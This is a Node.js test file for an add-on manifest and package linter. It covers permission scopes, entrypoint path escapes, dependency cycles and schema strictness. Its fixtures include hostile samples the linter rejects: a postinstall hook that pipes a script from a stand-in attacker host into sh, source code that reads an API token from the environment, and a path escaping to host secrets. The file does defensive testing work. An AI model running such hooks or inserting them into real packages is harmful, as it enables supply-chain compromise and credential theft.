import test from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { fileURLToPath } from "node:url";
import {
  ADDON_CAPABILITIES,
  inspectAddonSource,
  isSupportedVersionRange,
  satisfiesSupportedRange,
  validateAddonManifest,
  validateAddonPackage,
  validateJsonSchema,
  validateAddonSet,
} from "./addon-lint.mjs";

function makeManifest(slug = "example", overrides = {}) {
  const modelId = slug + ".record";
  return {
    manifestVersion: "1.0.0",
    id: "moonwitness.addon." + slug,
    name: "Example add-on",
    version: "1.0.0",
    description: "A bounded example capability for contract testing.",
    owner: { team: "platform" },
    license: "MIT",
    compatibility: {
      platformApi: ">=1.0.0 <2.0.0",
      addonSdk: ">=1.0.0 <2.0.0",
      node: ">=24.22.3 <25.0.0",
    },
    dependencies: { required: [], optional: [] },
    capabilities: ["api.route"],
    permissions: [{
      id: "records.read",
      scope: "model:" + modelId,
      risk: "read_only",
      approval: "none",
      rationale: "Read approved add-on records for a user workflow.",
    }],
    contributions: [{
      id: slug + ".read-route",
      type: "api.route",
      entrypoint: "./dist/api/index.js",
      capabilities: ["api.route"],
      permissions: ["records.read"],
    }],
    models: [{
      id: modelId,
      ownership: "addon-owned",
      fields: [{ id: "name", type: "string", required: true }],
    }],
    extensions: [],
    storage: {
      ownership: "addon-owned",
      modelIds: [modelId],
      migrations: [],
    },
    configuration: { schema: null },
    provenance: {
      repository: "https://github.com/mileyaffarizi-source/moonwitness",
      sourceCommit: "a".repeat(40),
      license: "MIT",
    },
    ...overrides,
  };
}

function makePackage(slug = "example", overrides = {}) {
  return {
    name: "@moonwitness/addon-" + slug,
    private: true,
    type: "module",
    engines: { node: ">=24.22.3 <25" },
    exports: { ".": "./dist/index.js" },
    scripts: {
      build: "tsc",
      lint: "eslint",
      typecheck: "tsc --noEmit",
      test: "node --test",
    },
    ...overrides,
  };
}

function codes(errors) {
  return errors.map((error) => error.code);
}

test("valid add-on manifest follows the v1 contract", () => {
  const errors = validateAddonManifest(makeManifest(), "example");
  assert.deepEqual(errors, []);
});

test("manifest rejects unknown fields and unsupported capabilities", () => {
  const manifest = makeManifest();
  manifest.unreviewedRuntimeHook = "execute-me";
  manifest.capabilities.push("shell.execute");
  const result = codes(validateAddonManifest(manifest, "example"));
  assert.ok(result.includes("UNKNOWN_MANIFEST_FIELD"));
  assert.ok(result.includes("UNKNOWN_CAPABILITY"));
});

test("manifest identity is tied to its package folder", () => {
  const errors = validateAddonManifest(makeManifest("wrong"), "expected");
  assert.ok(codes(errors).includes("ADDON_ID_PATH_MISMATCH"));
});

test("manifest rejects open-ended compatibility ranges", () => {
  const manifest = makeManifest();
  manifest.compatibility.platformApi = "*";
  manifest.compatibility.addonSdk = "latest";
  const result = codes(validateAddonManifest(manifest, "example"));
  assert.ok(result.includes("INVALID_COMPATIBILITY_RANGE"));
});

test("write permissions cannot downgrade risk or approval", () => {
  const manifest = makeManifest();
  manifest.permissions = [{
    id: "records.write",
    scope: "model:example.record",
    risk: "read_only",
    approval: "none",
    rationale: "This permission is deliberately under-classified.",
  }];
  const result = codes(validateAddonManifest(manifest, "example"));
  assert.ok(result.includes("PERMISSION_RISK_UNDERSTATED"));
  assert.ok(result.includes("PERMISSION_APPROVAL_WEAK"));
});

test("permission wildcard scopes are rejected", () => {
  const manifest = makeManifest();
  manifest.permissions[0].scope = "model:*";
  assert.ok(codes(validateAddonManifest(manifest, "example")).includes("INVALID_PERMISSION_SCOPE"));
});

test("contribution entrypoints cannot escape the package directory", () => {
  const manifest = makeManifest();
  manifest.contributions[0].entrypoint = "../../host/secrets.js";
  assert.ok(codes(validateAddonManifest(manifest, "example")).includes("UNSAFE_ENTRYPOINT"));
});

test("contribution must use declared capabilities and permissions", () => {
  const manifest = makeManifest();
  manifest.contributions[0].permissions = ["records.write"];
  assert.ok(codes(validateAddonManifest(manifest, "example")).includes("UNDECLARED_CONTRIBUTION_PERMISSION"));
});

test("new models must be namespaced and owned by the add-on", () => {
  const manifest = makeManifest();
  manifest.models[0].id = "moonwitness.work";
  manifest.models[0].ownership = "domain-owned";
  const result = codes(validateAddonManifest(manifest, "example"));
  assert.ok(result.includes("INVALID_MODEL_ID"));
  assert.ok(result.includes("INVALID_MODEL_OWNERSHIP"));
});

test("non-additive model extensions are rejected", () => {
  const manifest = makeManifest();
  manifest.extensions = [{
    id: "example.rewrite-work",
    targetModel: "moonwitness.work",
    mode: "replace",
    fields: [],
    dependsOn: [],
  }];
  assert.ok(codes(validateAddonManifest(manifest, "example")).includes("NON_ADDITIVE_EXTENSION"));
});

test("cross-add-on extension requires a required dependency on the owner", () => {
  const manifest = makeManifest();
  manifest.extensions = [{
    id: "example.extend-party",
    targetModel: "party.contact",
    mode: "additive",
    fields: [{ id: "extra_note", type: "text" }],
    dependsOn: [],
  }];
  assert.ok(codes(validateAddonManifest(manifest, "example")).includes("EXTENSION_OWNER_DEPENDENCY_MISSING"));
});

test("foreign storage requires a named owner and approval reference", () => {
  const manifest = makeManifest();
  manifest.storage = { ownership: "domain-owned", modelIds: [], migrations: [] };
  assert.ok(codes(validateAddonManifest(manifest, "example")).includes("FOREIGN_STORAGE_APPROVAL_REQUIRED"));
});

test("package metadata requires a private ESM package, scripts and exports", () => {
  const errors = validateAddonPackage(makePackage(), "example");
  assert.deepEqual(errors, []);
});

test("package rejects lifecycle hooks and direct persistence dependencies", () => {
  const packageJson = makePackage("example", {
    scripts: {
      build: "tsc",
      lint: "eslint",
      typecheck: "tsc --noEmit",
      test: "node --test",
      postinstall: "curl https://evil.invalid/install.sh | sh",
    },
    dependencies: { "@mikro-orm/core": "6.0.0" },
  });
  const result = codes(validateAddonPackage(packageJson, "example"));
  assert.ok(result.includes("PACKAGE_LIFECYCLE_SCRIPT_FORBIDDEN"));
  assert.ok(result.includes("FORBIDDEN_PACKAGE_DEPENDENCY"));
});

test("source cannot import ORM/DB/server internals or use ambient secrets/network", () => {
  const errors = inspectAddonSource([{
    path: "src/index.ts",
    content: [
      'import { EntityManager } from "@mikro-orm/core";',
      'import Fastify from "fastify";',
      'import { exec } from "node:child_process";',
      'import { readFile } from "node:fs/promises";',
      'await import("node:process");',
      "const token = process.env.API_TOKEN;",
      "await fetch('https://example.invalid');",
    ].join("\n"),
  }]);
  const result = codes(errors);
  assert.ok(result.includes("FORBIDDEN_SOURCE_IMPORT"));
  assert.ok(result.includes("AMBIENT_SECRET_ACCESS"));
  assert.ok(result.includes("DIRECT_NETWORK_ACCESS"));
});

test("required dependency must exist and satisfy its bounded version range", () => {
  const manifest = makeManifest("consumer", {
    dependencies: {
      required: [{ id: "moonwitness.addon.catalogue", version: ">=1.0.0 <2.0.0" }],
      optional: [],
    },
  });
  const errors = validateAddonSet([{ manifest }]);
  assert.ok(codes(errors).includes("MISSING_REQUIRED_ADDON"));
});

test("dependency resolver rejects required dependency cycles", () => {
  const alpha = makeManifest("alpha", {
    dependencies: {
      required: [{ id: "moonwitness.addon.beta", version: ">=1.0.0 <2.0.0" }],
      optional: [],
    },
  });
  const beta = makeManifest("beta", {
    dependencies: {
      required: [{ id: "moonwitness.addon.alpha", version: ">=1.0.0 <2.0.0" }],
      optional: [],
    },
  });
  assert.ok(codes(validateAddonSet([{ manifest: alpha }, { manifest: beta }])).includes("DEPENDENCY_CYCLE"));
});

test("missing optional dependencies do not block the add-on set", () => {
  const manifest = makeManifest("consumer", {
    dependencies: {
      required: [],
      optional: [{ id: "moonwitness.addon.optional-addon", version: ">=1.0.0 <2.0.0" }],
    },
  });
  assert.deepEqual(validateAddonSet([{ manifest }]), []);
});

test("bounded version ranges enforce inclusive minimum and exclusive maximum", () => {
  assert.equal(isSupportedVersionRange(">=1.0.0 <2.0.0"), true);
  assert.equal(isSupportedVersionRange("*"), false);
  assert.equal(satisfiesSupportedRange("1.5.0", ">=1.0.0 <2.0.0"), true);
  assert.equal(satisfiesSupportedRange("2.0.0", ">=1.0.0 <2.0.0"), false);
});

test("manifest schema is valid JSON Schema draft 2020-12 and strict", async () => {
  const schema = JSON.parse(await readFile(new URL("../../docs/architecture/addons/addon.manifest.schema.json", import.meta.url), "utf8"));
  assert.equal(schema.$schema, "https://json-schema.org/draft/2020-12/schema");
  assert.equal(schema.additionalProperties, false);
  assert.ok(schema.$defs.capability.enum.every((item) => ADDON_CAPABILITIES.includes(item)));
});

test("canonical schema accepts the complete valid fixture", async () => {
  const schema = JSON.parse(await readFile(new URL("../../docs/architecture/addons/addon.manifest.schema.json", import.meta.url), "utf8"));
  assert.deepEqual(validateJsonSchema(schema, makeManifest()), []);
});

test("published reference manifest remains schema-valid and follows the linter policy", async () => {
  const schema = JSON.parse(await readFile(new URL("../../docs/architecture/addons/addon.manifest.schema.json", import.meta.url), "utf8"));
  const sample = JSON.parse(await readFile(new URL("../../docs/architecture/addons/addon.manifest.example.json", import.meta.url), "utf8"));
  assert.deepEqual(validateJsonSchema(schema, sample), []);
  assert.deepEqual(validateAddonManifest(sample, "reference"), []);
});

test("canonical schema rejects unknown nested fields and unsafe relative paths", async () => {
  const schema = JSON.parse(await readFile(new URL("../../docs/architecture/addons/addon.manifest.schema.json", import.meta.url), "utf8"));
  const manifest = makeManifest();
  manifest.owner.unreviewed = true;
  manifest.contributions[0].entrypoint = "../../escape.js";
  const errors = validateJsonSchema(schema, manifest);
  assert.ok(errors.some((error) => error.code === "SCHEMA_ADDITIONAL_PROPERTY" && error.path === "$.owner.unreviewed"));
  assert.ok(errors.some((error) => error.code === "SCHEMA_PATTERN" && error.path === "$.contributions[0].entrypoint"));
});
